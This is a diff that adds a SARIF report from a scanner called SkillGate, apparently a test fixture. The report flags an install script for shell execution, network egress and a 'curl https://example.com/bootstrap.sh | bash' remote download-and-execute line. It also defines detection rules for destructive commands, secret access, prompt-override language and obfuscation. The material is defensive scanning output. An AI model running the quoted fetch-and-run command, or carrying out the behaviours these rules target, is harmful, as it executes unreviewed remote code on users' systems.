@@ -1,0 +1,185 @@
+{
+  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+  "runs": [
+    {
+      "results": [
+        {
+          "level": "warning",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "scripts/install.sh"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Shell execution detected: #!/usr/bin/env bash"
+          },
+          "ruleId": "SG001"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "scripts/install.sh"
+                },
+                "region": {
+                  "startLine": 2
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Shell execution detected: curl https://example.com/bootstrap.sh | bash"
+          },
+          "ruleId": "SG001"
+        },
+        {
+          "level": "warning",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "scripts/install.sh"
+                },
+                "region": {
+                  "startLine": 2
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Network egress detected: Host: example.com"
+          },
+          "ruleId": "SG003"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "scripts/install.sh"
+                },
+                "region": {
+                  "startLine": 2
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Remote download followed by execution: curl https://example.com/bootstrap.sh | bash"
+          },
+          "ruleId": "SG004"
+        }
+      ],
+      "tool": {
+        "driver": {
+          "informationUri": "https://github.com/OpenEvalGate/skillgate",
+          "name": "SkillGate",
+          "rules": [
+            {
+              "fullDescription": {
+                "text": "The file appears to invoke shell execution."
+              },
+              "id": "SG001",
+              "name": "SG001",
+              "shortDescription": {
+                "text": "Shell execution detected"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "The file contains a destructive command pattern."
+              },
+              "id": "SG002",
+              "name": "SG002",
+              "shortDescription": {
+                "text": "Destructive command detected"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "The file appears to access a network resource."
+              },
+              "id": "SG003",
+              "name": "SG003",
+              "shortDescription": {
+                "text": "Network egress detected"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Remote content is executed."
+              },
+              "id": "SG004",
+              "name": "SG004",
+              "shortDescription": {
+                "text": "Remote download followed by execution"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "A likely secret is referenced."
+              },
+              "id": "SG005",
+              "name": "SG005",
+              "shortDescription": {
+                "text": "Secret or credential access detected"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "The file may write to the filesystem."
+              },
+              "id": "SG006",
+              "name": "SG006",
+              "shortDescription": {
+                "text": "Filesystem write capability detected"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Instruction-conflict language is present."
+              },
+              "id": "SG007",
+              "name": "SG007",
+              "shortDescription": {
+                "text": "Prompt override language detected"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Hidden or encoded content is present."
+              },
+              "id": "SG008",
+              "name": "SG008",
+              "shortDescription": {
+                "text": "Suspicious Unicode or obfuscation detected"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "An MCP server configuration is present."
+              },
+              "id": "SG009",
+              "name": "SG009",
+              "shortDescription": {
+                "text": "MCP server configuration discovered"
+              }
+            }
+          ],
+          "semanticVersion": "0.1.1"
+        }
+      }
+    }
+  ],
+  "version": "2.1.0"
+}
